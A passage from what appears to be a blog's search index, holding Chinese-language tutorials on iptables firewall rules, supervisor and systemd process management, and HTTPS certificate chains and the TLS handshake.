mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle\n+ raw表：关闭nat表上启用的连接追踪机制；iptable_raw\n\n也就是说，我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这4张\"表\"中。\n\n\n\n### 1.3 表链关系\n\n| 四表/五链 | PREROUTING | INPUT      | FORWARD | OUTPUT | POSTROUTING |\n| --------- | ---------- | ---------- | ------- | ------ | ----------- |\n| filter    |            | √          | √       | √      |             |\n| nat       | √          | √(centos7) |         | √      | √           |\n| mangle    | √          | √          | √       | √      | √           |\n| raw       | √          |            |         | √      |             |\n\n\n\n表的优先级关系:  raw --> mangle --> nat --> filter ,  raw 最高\n\n![1](iptables使用教程01/2.png)\n\n\n\n![1](iptables使用教程01/4.png)\n\n# 2. 规则\n\n规则是根据指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理；\n\n### 2.1 匹配条件\n\n匹配条件分为基本匹配条件与扩展匹配条件\n\n+ 基本匹配条件：\n  源地址Source IP，目标地址 Destination IP\n  上述内容都可以作为基本匹配条件。\n+ 扩展匹配条件：\n  除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。\n  源端口Source Port, 目标端口Destination Port\n  上述内容都可以作为扩展匹配条件\n\n### 2.2 处理动作\n\n处理动作在iptables中被称为target（这样说并不准确，我们暂且这样称呼），动作也可以分为基本动作和扩展动作。\n此处列出一些常用的动作，之后的文章会对它们进行详细的示例与总结：\n\n+ ACCEPT：允许数据包通过。\n+ DROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。\n+ REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。\n+ SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。\n+ MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。\n+ DNAT：目标地址转换。\n+ REDIRECT：在本机做端口映射。\n+ LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。\n\n补充一下DROP和REJECT的区别。DROP是直接把匹配到的报文丢弃，REJECT除了把报文丢弃还会给该报文中的源IP发一个ICMP报文说明目的不可达(直接回复不可达, 更强硬)。前者报文发送方只能等超时，而后者发送方因为收到了ICMP不可达所以马上就给出了提示。\n\n\n\n# 3. filter过滤规则\n\nfilter负责过滤功能，比如允许哪些IP地址访问，拒绝哪些IP地址访问，允许访问哪些端口，禁止访问哪些端口，filter表会根据我们定义的规则进行过滤，filter表应该是我们最常用到的表了。\n\n### 3.1 查看规则\n\n怎样查看filter表中的规则呢？使用如下命令即可查看。\n\n```bash\niptables -t filter -L\n```\n\n刚才提到，我们可以使用iptables -t filter -L命令列出filter表中的所有规则，那么举一反三，我们也可以查看其它表中的规则，示例如下。\n\n```bash\niptables -t raw -L\niptables -t mangle -L\niptables -t nat -L\n```\n\n其实，我们可以省略-t filter，当没有使用-t选项指定表时，默认为操作filter表，即iptables -L表示列出filter表中的所有规则。\n\n\n\n### 3.2 详细信息\n\n我们还可以只查看指定表中的指定链的规则，比如，我们只查看filter表中INPUT链的规则，示例如下（注意大小写）。\n\n```bash\n# iptables --line-numbers  -nvL INPUT\nChain INPUT (policy ACCEPT 14M packets, 2062M bytes)\nnum   pkts bytes target     prot opt in     out     source               destination\n1    2697K  114M KUBE-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes service portals */\n2    2697K  114M KUBE-EXTERNAL-SERVICES  all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate NEW /* kubernetes externally-visible service portals */\n3     906M  477G KUBE-FIREWALL  all  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\n+ 头含义\n\n  上图中INPUT链后面的括号中包含policy ACCEPT ，0 packets，0bytes 三部分。\n\n  ```ini\n  policy:表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT\n  packets:表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。\n  bytes:表示当前链默认策略匹配到的所有包的大小总和。\n  ```\n\n  其实，我们可以把packets与bytes称作\"计数器\"，上图中的计数器记录了默认策略匹配到的报文数量与总大小，\"计数器\"只会在使用-v选项时，才会显示出来。\n\n  \n\n+ 字段含义\n\n  ```ini\n  pkts:对应规则匹配到的报文的个数。\n  bytes:对应匹配到的报文包的大小总和。\n  target:规则对应的target，往往表示规则对应的\"动作\"，即规则匹配成功后需要采取的措施。\n  prot:表示规则对应的协议，是否只针对某些协议应用此规则。\n  opt:表示规则对应的选项。\n  in:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。\n  out:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。\n  source:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。\n  destination:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。\n  ```\n\n  \n\n### 3.3 增加规则\n\n为了准备一个从零开始的环境，使用`iptables -F INPUT`命令清空filter表INPUT链中的规则。\n\n```bash\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 215 packets, 16538 bytes)\n pkts bytes target     prot opt in     out     source               destination\n```\n\n清空INPUT链以后，filter表中的INPUT链已经不存在任何的规则，但是可以看出，INPUT链的默认策略是ACCEPT，也就是说，INPUT链默认\"放行\"所有发往本机的报文，当没有任何规则时，会接受所有报文，当报文没有被任何规则匹配到时，也会默认放行报文。\n\n\n\n+ 增加\n\n```bash\niptables -t filter -I INPUT -s 123.117.179.97 -j DROP\n```\n\n在目标服务器增加一条本地的 ip, 发现已经 ping不通了.\n\n上图中，使用 -t选项指定了要操作的表，此处指定了操作filter表，与之前的查看命令一样，不使用-t选项指定表时，默认为操作filter表。\n使用-I选项，指明将\"规则\"插入至哪个链中，-I表示insert，即插入的意思，所以-I INPUT表示将规则插入于INPUT链中，即添加规则之意。\n\n使用-s选项，指明\"匹配条件\"中的\"源地址\"，即如果报文的源地址属于-s对应的地址，那么报文则满足匹配条件，-s为source之意，表示源地址。\n\n使用-j选项，指明当\"匹配条件\"被满足时，所对应的动作，上例中指定的动作为DROP，在上例中，当报文的源地址为223.70.253.1时，报文则被DROP（丢弃）。\n\n\n\n+ 查看\n\n再次查看filter表中的INPUT链，发现规则已经被添加了，在iptables中，动作被称之为\"target\"，所以，上图中taget字段对应的动作为DROP。\n\n```bash\nroot@tencent:~# iptables -vL INPUT\nChain INPUT (policy ACCEPT 2043 packets, 135K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n   66  9796 DROP       all  --  any    any     123.117.179.97       anywhere  \n```\n\n注意看, 可以看到 bytes 的字节数, 说明已经匹配上了.\n\n\n\n+ 顺序\n\n规则的顺序很重要。\n\n如果报文已经被前面的规则匹配到，iptables则会对报文执行对应的动作，即使后面的规则也能匹配到当前报文，很有可能也没有机会再对报文执行相应的动作。\n\n\n\n### 3.4 删除规则\n\n此刻，如果我们想要删除filter表中INPUT中的一条规则，该怎么做呢？有两种办法\n方法一：根据规则的编号去删除规则\n方法二：根据具体的匹配条件与动作删除规则\n\n```bash\n# 添加两种\niptables -t filter -A INPUT -s 1.1.1.1 -j DROP\niptables -t filter -A INPUT -s 1.1.1.2 -j DROP\n\n\niptables --line -nvL INPUT\n3        0     0 DROP       all  --  *      *       1.1.1.1              0.0.0.0/0           \n4        0     0 DROP       all  --  *      *       1.1.1.2              0.0.0.0/0  \n\n\n# 两种删除方式\niptables -D INPUT 3\niptables -D INPUT -s 1.1.1.2 -j DROP\n```\n\n\n\n+ 删除所有\n\n  而删除指定表中某条链中的所有规则的命令，我们在一开始就使用到了，就是\"iptables -t 表名 -F 链名\"\n  -F选项为flush之意，即冲刷指定的链，即删除指定链中的所有规则，但是注意，此操作相当于删除操作，在没有保存iptables规则的情况下，请慎用。\n\n\n\n### 3.5 修改规则\n\n建议删除后再新增\n\n+ 修改默认策略\n  使用-t指定要操作的表，使用-P选项指定要修改的链，下例中，`-P FORWARD ACCEPT`表示将表中FORWRD链的默认策略改为ACCEPT。\n\n  ```bash\n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy DROP 0 packets, 0 bytes)\n  \n  # 执行修改默认\n  iptables -P FORWARD ACCEPT\n  \n  iptables --line -nvL FORWARD\n  Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n  ```\n\n  \n\n### 3.6 保存规则\n\n在默认的情况下，我们对\"防火墙\"所做出的修改都是\"临时的\"，换句话说就是，当重启iptables服务或者重启服务器以后，我们平常添加的规则或者对规则所做出的修改都将消失，为了防止这种情况的发生，我们需要将规则\"保存\"。\n\n+ centos\n\n  centos6中，使用\"service iptables save\"命令即可保存规则，规则默认保存在/etc/sysconfig/iptables文件中\n\n  ```bash\n  service iptables save\n  ```\n\n  centos7中，使用firewall替代了原来的iptables service\n\n  ```bash\n  firewall-cmd --zone=public --add-port=3000/tcp --permanent\n  firewall-cmd --reload\n  \n  # 也可以安装 iptables-service\n  yum install -y iptables-services\n  systemctl disable firewalld\n  systemctl enable iptables\n  service iptables save\n  ```\n\n  还可以使用另一种方法保存iptables规则，就是使用iptables-save命令\n  使用iptables-save并不能保存当前的iptables规则，但是可以将当前的iptables规则以\"保存后的格式\"输出到屏幕上。可以使用iptables-save命令，再配合重定向\n\n  ```bash\n  iptables-save > /etc/sysconfig/iptables\n  iptables-restore < /etc/sysconfig/iptables\n  ```\n\n+ ubuntu\n\n  ```bash\n  sudo apt-get install iptables-persistent\n  \n  sudo /etc/init.d/iptables-persistent save \n  sudo /etc/init.d/iptables-persistent reload\n  \n  # Ubuntu 16.04 Server\n  sudo netfilter-persistent save\n  sudo netfilter-persistent reload\n  ```\n\n\n\n# 4. 匹配条件\n\n### 4.1 匹配方式\n\n```bash\n# 单个匹配\niptables -I INPUT -s 1.1.1.2 -j DROP\n\n# 多个匹配\niptables -I INPUT -s 1.1.1.3,1.1.1.4 -j DROP\n\n# 网段匹配\niptables -I INPUT -s 1.1.1.5/23 -j DROP\n\n# 取反匹配\niptables -I INPUT ! -s 1.1.1.6 -j ACCEPT\n```\n\n\n\n+ 取反注意点\n\n使用 \"!\" 取反后则表示，报文源地址IP只要不为1.1.1.6即满足条件，那么，上例中规则表达的意思就是，只要发往本机的报文的源地址不是1.1.1.6，就接受报文。\n\n只要报文的源IP不是1.1.1.6，那么就接受此报文，但是，某些小伙伴可能会误会，把上例中的规则理解成如下含义，\n\n只要报文的源IP是1.1.1.6，那么就不接受此报文，这种理解与上述理解看似差别不大，其实完全不一样，这样理解是错误的，上述理解才是正确的。\n\n> 换句话说就是，报文的源IP不是1.1.1.6时，会被接收，并不能代表，报文的源IP是1.1.1.6时，会被拒绝。\n\n\n\n### 4.2 匹配IP地址\n\n```bash\n# 只丢弃从 1.1.1.7 发往 1.1.1.8 这个IP的报文\niptables -I INPUT -s 1.1.1.7 -d 1.1.1.8 -j DROP\n```\n\n如果我们不指定任何目标地址，则目标地址默认为0.0.0.0/0，同理，如果我们不指定源地址，源地址默认为0.0.0.0/0，0.0.0.0/0表示所有IP，示例如下。\n\n与-s选项一样，-d选项也可以使用\"叹号\"进行取反，也能够同时指定多个IP地址，使用\"逗号\"隔开即可。\n\n但是请注意，不管是-s选项还是-d选项，取反操作与同时指定多个IP的操作不能同时使用。\n\n\n\n> 需要明确的一点就是：当一条规则中有多个匹配条件时，这多个匹配条件之间，默认存在\"与\"的关系。也就是取其交集的意思。\n\n\n\n### 4.3 匹配协议类型\n\n我们可以使用-p选项，指定需要匹配的报文的协议类型。\n\n拒绝来自 `1.1.1.2`的tcp类型的请求\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -j DROP\n\n\nroot@tencent:~# iptables -L INPUT\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination\nDROP       tcp  --  1.1.1.2              anywhere\n```\n\n\n\ncentos6中，-p选项支持如下协议类型\n\n```bash\ntcp, udp, udplite, icmp, esp, ah, sctp\n```\n\ncentos7中，-p选项支持如下协议类型\n\n```bash\ntcp, udp, udplite, icmp, icmpv6,esp, ah, sctp, mh\n```\n\n当不使用-p指定协议类型时，默认表示所有类型的协议都会被匹配到，与使用-p all的效果相同。\n\n\n\n+ 测试\n\n  ```bash\n  ping 49.234.15.70 # 服务器可以通\n  \n  ps -ef | grep sshd #  获取登录者 root@pts/1\n  who -a | grep pts/0 # 获取登录者ip 20816 (223.70.253.1)\n  \n  iptables -I INPUT -s 223.70.253.1 -p icmp -j DROP # 服务器禁ping\n  \n  ping 49.234.15.70 # 服务器不通了\n  ```\n\n\n\n### 4.4 匹配网卡接口\n\n+ 入口\n\n使用-i选项，指定网卡名称, 表示丢弃由eth0网卡流入的icmp类型的报文。\n\n```bash\niptables -I INPUT -s 223.70.253.1 -i eth0 -p icmp -j DROP\n```\n\n\n\n-i选项是用于匹配报文流入的网卡的，也就是说，从本机发出的报文是不可能会使用到-i选项的，因为这些由本机发出的报文压根不是从网卡流入的，而是要通过网卡发出的，从这个角度考虑，-i选项的使用是有限制的。\n\n所以-i选项只能用于上图中的PREROUTING链、INPUT链、FORWARD链，这是-i选项的特殊性。\n\n\n\n+ 出口\n\n当主机有多块网卡时，可以使用-o选项，匹配报文将由哪块网卡流出，没错，-o选项与-i选项是相对的，-i选项用于匹配报文从哪个网卡流入，-o选项用于匹配报文将从哪个网卡流出。\n\n-o选项只能用于FORWARD链、OUTPUT链、POSTROUTING链。\n\n\n\n### 4.5 匹配端口\n\n匹配端口属于扩展匹配条件, 需要依赖一些扩展模块.\n\n##### 4.5.1 端口 -m tcp\n\n选项--dport可以匹配报文的目标端口，--dport意为destination-port，即表示目标端口。与之前的选项不同，--dport前有两条\"横杠\"，而且，使用--dport选项时，必须事先指定了使用哪种协议，即必须先使用-p选项\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m tcp --dport 22 -j DROP\n\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 1631 packets, 1525K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            tcp dpt:22\n```\n\n\n\n在使用--dport之前，我们使用-m选项，指定了对应的扩展模块为tcp，也就是说，如果想要使用--dport这个扩展匹配条件，则必须依靠某个扩展模块完成，上例中，这个扩展模块就是tcp扩展模块，最终，我们使用的是tcp扩展模块中的dport扩展匹配条件。\n\n+ -m tcp表示使用tcp扩展模块，--dport表示tcp扩展模块中的一个扩展匹配条件，可用于匹配报文的目标端口。\n+ -p tcp与 -m tcp并不冲突，-p用于匹配报文的协议，-m 用于指定扩展模块的名称，正好，这个扩展模块也叫tcp。\n\n\n\n扩展匹配条件是可以取反的，同样是使用\"!\"进行取反，比如 \"! --dport 22\"，表示目标端口不是22的报文将会被匹配到。\n\n代表\"源端口\"的扩展匹配条件为--sport, 不管是--sport还是--dsport，都能够指定一个端口范围，比如，--dport 22:25表示目标端口为22到25之间的所有端口，即22端口、23端口、24端口、25端口\n\n\n\n##### 4.5.1 多个端口 -m multiport\n\n如果想要同时指定多个离散的端口，需要借助另一个扩展模块，\"multiport\"模块。\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m multiport --dports 22,36,80 -j DROP\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 184 packets, 109K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            multiport dports 22,36,80\n```\n\n","tags":["iptables"],"categories":["命令"]},{"title":"supervisor进程管理使用","url":"%2Fp%2F1825ecdb.html","content":"\nsupervisor是一个C/S系统,它可以在类UNIX系统上控制系统进程，由python编写，提供了大量的功能来实现对进程的管理。\n\n<!-- more -->\n\n# 1. supervisor 介绍\n\nsupervisor主要包含以下四个部分：\n\n+ supervisord：\n\n  这个是supervisor服务的主要管理器，负责管理我们配置的子进程，包括重启崩溃或异常退出的子进程，同时也响应来自客户端的请求。\n\n+ supervisorctl：\n\n  supervisord服务的客户端命令行。听过这个，我们可以获得由主进程控制的子进程的状态，停止和启动子进程，并获得主进程的运行列表。\n\n+ Web Server：\n\n  supervisorctl功能娉美。这个是通过web界面查看和控制进程状态。\n\n+ XML-RPC Interface：\n\n  服务于web UI的同一个HTTP服务器提供一个XML-RPC接口，可以用来询问和控制管理程序及其运行的程序\n\n\n\n# 2. supervisor安装\n\n```bash\n# 安装\nsudo pip install supervisor\n\n# 启动服务\nsupervisord -c /etc/supervisord.conf\n\n# 查看是否启动\nps -ef | grep supervisord\n```\n\n\n\n# 3. supervisor配置\n\nsupervisor 是一个 C/S 模型的程序，supervisord是 server 端，对应的 client 端：supervisorctl\n\n### 3.1 默认配置\n\n运行`echo_supervisord_conf` 命令输出默认的配置项, 默认 supervisor 会使用 /etc/supervisord.conf 作为默认配置文件。\n\n文件内可以看到如下配置, 所以自定义的配置文件可以放到`/etc/supervisor/conf.d/`文件夹下.\n\n```ini\n[include]\nfiles = /etc/supervisor/conf.d/*.conf\n```\n\n\n\n### 3.2 应用程序配置\n\n```ini\n[program:usercenter]  # usercenter 是应用程序的唯一标识，不能重复。对该程序的所有操作（start, restart 等）都通过名字来实现。\ndirectory = /home/leon/projects/usercenter ; 程序的启动目录\ncommand = gunicorn -w 8 -b 0.0.0.0:17510 wsgi:app  ; 启动命令\nautostart = true     ; 在 supervisord 启动的时候也自动启动\nstartsecs = 5        ; 启动 5 秒后没有异常退出，就当作已经正常启动了\nautorestart = true   ; 程序异常退出后自动重启\nstartretries = 3     ; 启动失败自动重试次数，默认是 3\nuser = leon          ; 用哪个用户启动\nredirect_stderr = true  ; 把 stderr 重定向到 stdout，默认 false\nstdout_logfile_maxbytes = 20MB  ; stdout 日志文件大小，默认 50MB\nstdout_logfile_backups = 20     ; stdout 日志文件备份数, 需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录\nstdout_logfile = /data/logs/usercenter_stdout.log\n```\n\n\n\n### 3.3 使用\n\n+ 更新配置, 修改配置后需要更新\n\n  ```bash\n  supervisorctl update\n  ```\n  \n+ 查看log, 直接查看配置里的log 即可\n\n  ```bash\n  stdout_logfile=/home/supervisor_log/uwsgi.log            \n  stderr_logfile=/home/supervisor_log/uwsgi.log\n  ```\n\n\n\n# 4. supervisor 常用命令\n\n```bash\nsupervisorctl update #更新新的配置到supervisord（不会重启原来已运行的程序）\nsupervisorctl reload #载入所有配置文件，并按新的配置启动、管理所有进程（会重启原来已运行的程序）\n\nsupervisorctl start xxx #启动某个进程\nsupervisorctl restart xxx #重启某个进程\nsupervisorctl stop xxx #停止某一个进程(xxx)，xxx为[program:theprogramname]里配置的值\nsupervisorctl stop groupworker #重启所有属于名为groupworker这个分组的进程(start,restart同理)\nsupervisorctl stop all #停止全部进程，注：start、restart、stop都不会载入最新的配置文\n\nsupervisorctl reread #当一个服务由自动启动修改为手动启动时执行一下就ok\n```\n\n\n\n# 5. systemd介绍\n\n> Systemd是Linux中的No.1进程, 可以用 systemd 管理 supervisor\n\nLinux 操作系统的启动首先从 BIOS 开始，然后由 Boot Loader 载入内核，并初始化内核。内核初始化的最后一步就是启动 init 进程。这个进程是系统的第一个进程，PID 为 1，又叫超级进程，也叫根进程。它负责产生其他所有用户进程。所有的进程都会被挂在这个进程下，如果这个进程退出了，那么所有的进程都被 kill 。如果一个子进程的父进程退了，那么这个子进程会被挂到 PID 1 下面。\n\n2010的有一天，一个在 RedHat工作的工程师 Lennart Poettering 和 Kay Sievers ，开始引入了一个新的 init 系统—— systemd。这是一个非常非常有野心的项目，这个项目几乎改变了所有的东西，systemd 不但想取代已有的 init 系统，而且还想干更多的东西。\n\n2014 年，Debian Linux 因为想准备使用 systemd 来作为标准的 init 守护进程来替换 sysvinit 。而围绕这个事的争论达到了空前的热度，争论中充满着仇恨，systemd 的支持者和反对者都在互相辱骂，导致当时 Debian 阵营开始分裂。\n\n今天，systemd 占据了几乎所有的主流的 Linux 发行版的默认配置，包括：Arch Linux、CentOS、CoreOS、Debian、Fedora、Megeia、OpenSUSE、RHEL、SUSE企业版和 Ubuntu。而且，对于 CentOS, CoreOS, Fedora, RHEL, SUSE这些发行版来说，不能没有 systemd。\n\n\n\n# 6. supervisor和 systemd 对比\n\n### 6.1 supervisor\n\n+ 优点\n\n  1 可以通过网页执行启动停止的操作\n  2 单配置文件可控制多个程序\n  3 可控制进程数量\n  4 进程资源控制能力比较强\n\n+ 缺点\n\n  1 本身需要被监控\n  2 开机自启依赖其他程序\n  3 不能跨主机\n  4 依赖于meld3、setuptools\n  5 进程需在前台运行\n\n\n\n### 6.2 systemd\n\n+ 优点\n\n  1可使用模板文件\n  2 附带定时器、路径监控器、数据监控器等功能\n  3 比较弱的跨主机能力，节点必须互相添加ssh key信任，只能远程控制已有的服务\n  4 开机可以自启\n  5 大多数发行版的标准配置\n  6 配套journalctl二进制保存日志很难伪造，日志格式统一，日志大小可限制\n  7 限制特定服务可用的系统资源量例如CPU、程序堆栈、文件句柄数量、子进程数量\n\n+ 缺点\n\n  1 多配置文件才能配置多个程序\n\n  \n\n# 7. 参考资料\n\n+ http://supervisord.org/index.html\n+ https://woni.link/post/12\n+ https://coolshell.cn/articles/17998.html","tags":["supervisor"],"categories":["命令"]},{"title":"https协议原理和认证过程","url":"%2Fp%2Fbe73ec63.html","content":"\n\n# 1. https 协议\n\nHTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输。\n\n<!-- more -->\n\n### 1.1 SSL历史和版本\n\n1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。\n\n1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。\n\n1996年，SSL 3.0版问世，得到大规模应用。\n\n1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版TLS 1.0版。\n\n2006年和2008年，TLS进行了两次升级，分别为TLS 1.1版和TLS 1.2版。最新的变动是2011年TLS 1.2的修订版。\n\n目前，应用最广泛的是TLS 1.0。但是，主流浏览器都已经实现了TLS 1.2的支持。\n\nTLS 1.0通常被标示为SSL 3.1,  TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。\n\n\n\n# 2. 数字证书\n\n数字证书，又称互联网上的\"身份证\"，用于唯一标识一个组织或一个服务器的，这就好比我们日常生活中使用的\"居民身份证\"，用于唯一标识一个人。\n\n网站的证书也是同样的道理。一般来说数字证书从受信的权威证书授权机构 (Certification Authority，证书授权机构)买来的。一般浏览器在出厂时就内置了诸多知名CA。\n\n实际应用中，HTTPS并非直接传输公钥信息，**而是使用携带公钥信息的数字证书来保证公钥的安全性和完整性**。用来保障HTTPS服务端发送给客户端的公钥信息不被篡改。\n\n\n\n### 2.1 数字证书内容\n\n一个数字证书通常包含了：\n\n- 服务器公钥；\n- 持有者信息；\n- 证书认证机构（CA）的信息；\n- CA 对这份文件的数字签名及使用的算法；\n- 证书有效期；\n- 还有一些其他额外信息；\n\n那数字证书的作用，是用来认证公钥持有者的身份，以防止第三方进行冒充。说简单些，证书就是用来告诉客户端，该服务端是否是合法的，因为只有证书合法，才代表服务端身份是可信的。\n\n我们用证书来认证公钥持有者的身份（服务端的身份），那证书又是怎么来的？又该怎么认证证书呢？\n\n为了让服务端的公钥被大家信任，服务端的证书都是由 CA （Certificate Authority证书认证机构）签名的，CA 就是网络世界里的公安局、公证中心，具有极高的可信度，所以由它来给各个公钥签名，信任的一方签发的证书，那必然证书也是被信任的。\n\n之所以要签名，是因为签名的作用可以避免中间人在获取证书时对证书内容的篡改。\n\n\n\n### 2.2 数字证书签发和验证流程\n\n如下图图所示，为数字证书签发和验证流程：\n\n<img src=\"https协议原理和认证过程/a.jpg\" alt=\"1\" style=\"zoom:47%;\" />\n\n##### CA 签发证书的过程\n\n1. 首先 CA 会把持有者的公钥、用途、颁发者、有效时间等信息打成一个包(蓝色)，然后对这些信息进行 Hash 计算，得到一个 Hash 值；\n\n2. 然后 CA 会使用自己的私钥将该 Hash 值加密，生成 Certificate Signature，也就是 CA 对证书做了签名；\n\n3. 最后将 Certificate Signature 添加在文件证书上，形成数字证书；（证书+签名）\n\n   \n\n##### 客户端校验服务端的数字证书的过程\n\n1. 首先客户端会使用同样的 Hash 算法计算该证书的 Hash 值 H1；\n\n2. 通常浏览器中集成了 CA 的公钥信息，浏览器收到服务器的证书后可以使用 CA 的公钥解密 Certificate Signature（签名） 内容，得到一个 Hash 值 H2 ；\n\n3. 最后比较 H1 和 H2，如果值相同，则为可信赖的证书，否则则认为服务器证书不可信。\n\n### 2.3 证书链\n\n但事实上，证书的验证过程中还存在一个证书信任链的问题，因为我们向 CA 申请的证书一般不是根证书签发的，而是由中间证书签发的，比如百度的证书，从下图你可以看到，证书的层级有三级：\n\n![1](https协议原理和认证过程/b.jpg)\n\n对于这种三级层级关系的证书的验证过程如下：\n\n- 客户端收到 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 的证书后，发现这个证书的签发者不是根证书，就无法根据本地已有的根证书中的公钥去验证 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 证书是否可信。于是，客户端根据 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 证书中的签发者，找到该证书的颁发机构是 “GlobalSign Organization Validation CA - SHA256 - G2”，然后向 CA 请求该中间证书。\n- 请求到证书后发现 “GlobalSign Organization Validation CA - SHA256 - G2” 证书是由 “GlobalSign Root CA” 签发的，由于 “GlobalSign Root CA” 没有再上级签发机构，说明它是根证书，也就是自签证书。应用软件会检查此证书有否已预载于根证书清单上，如果有，则可以利用根证书中的公钥去验证 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，如果发现验证通过，就认为该中间证书是可信的。\n- “GlobalSign Organization Validation CA - SHA256 - G2” 证书被信任后，可以使用 “GlobalSign Organization Validation CA - SHA256 - G2” 证书中的公钥去验证 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 证书的可信性，如果验证通过，就可以信任 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 证书。\n\n在这些步骤中，最开始客户端只信任根证书 GlobalSign Root CA 证书的，然后 “GlobalSign Root CA” 证书信任 “GlobalSign Organization Validation CA - SHA256 - G2” 证书，而 “GlobalSign Organization Validation CA - SHA256 - G2” 证书又信任 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 证书，于是客户端也信任 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/)证书。\n\n总括来说，由于用户信任 GlobalSign，所以由 GlobalSign 所担保的 [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 可以被信任，另外由于用户信任操作系统或浏览器的软件商，所以由软件商预载了根证书的 GlobalSign 都可被信任。\n\n<img src=\"https协议原理和认证过程/c.jpg\" alt=\"1\" style=\"zoom:50%;\" />\n\n操作系统里一般都会内置一些根证书，比如我的 MAC 电脑里内置的根证书有这么多：\n\n<img src=\"https协议原理和认证过程/d.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\n这样的一层层地验证就构成了一条信任链路，整个证书信任链验证流程如下图所示：\n\n<img src=\"https协议原理和认证过程/e.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\n最后一个问题，为什么需要证书链这么麻烦的流程？Root CA 为什么不直接颁发证书，而是要搞那么多中间层级呢？\n\n这是为了确保根证书的绝对安全性，将根证书隔离地越严格越好，不然根证书如果失守了，那么整个信任链都会有问题。\n\n\n\n# 3. tls 认证过程（四次握手）\n\n用 Wireshark 工具抓了用 RSA 密钥交换的 TLS 握手过程，你可以从下面看到，一共经历来四次握手\n\n![1](https协议原理和认证过程/0.jpg)\n\n<img src=\"https协议原理和认证过程/v2-d3ab3e41c76aa233f5cd4898bc9e819e_b.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\n### 3.1 客户端向服务端发送 **Client Hello** 消息\n\n客户端首先会发一个「Client Hello」消息，字面意思我们也能理解到，这是跟服务器「打招呼」。\n\n消息里面有客户端使用的 TLS 版本号、支持的密码套件列表，以及生成的随机数（Client Random），这个随机数会被服务端保留，它是生成对称加密密钥的材料之一。\n\n\n![1](https协议原理和认证过程/1.jpg)\n\n\n\n### 3.2 服务端向客户端发送 **Server Hello** 消息\n\n当服务端收到客户端的「Client Hello」消息后，会确认 TLS 版本号是否支持，和从密码套件列表中选择一个密码套件，以及生成随机数（Server Random）。\n\n接着，返回「Server Hello」消息，消息里面有服务器确认的 TLS 版本号，也给出了随机数（Server Random），然后从客户端的密码套件列表选择了一个合适的密码套件。\n\n![1](https协议原理和认证过程/2.jpg)\n\n\n\n可以看到，服务端选择的密码套件是 “Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256”。\n\n这个密码套件看起来真让人头晕，好一大串，但是其实它是有固定格式和规范的。基本的形式是「密钥交换算法 + 签名算法 + 对称加密算法 + 摘要算法」， 一般 WITH 单词前面有两个单词，第一个单词是约定密钥交换的算法，第二个单词是约定证书的验证算法。比如刚才的密码套件的意思就是：\n\n- 由于 WITH 单词只有一个 RSA，则说明握手时密钥交换算法和签名算法都是使用 RSA；\n\n- 握手后的通信使用 AES 对称算法，密钥长度 128 位，分组模式是 GCM；\n\n- 摘要算法 SHA256 用于消息认证和产生随机数；\n\n  \n\n 就前面这两个客户端和服务端相互「打招呼」的过程，客户端和服务端就已确认了 TLS 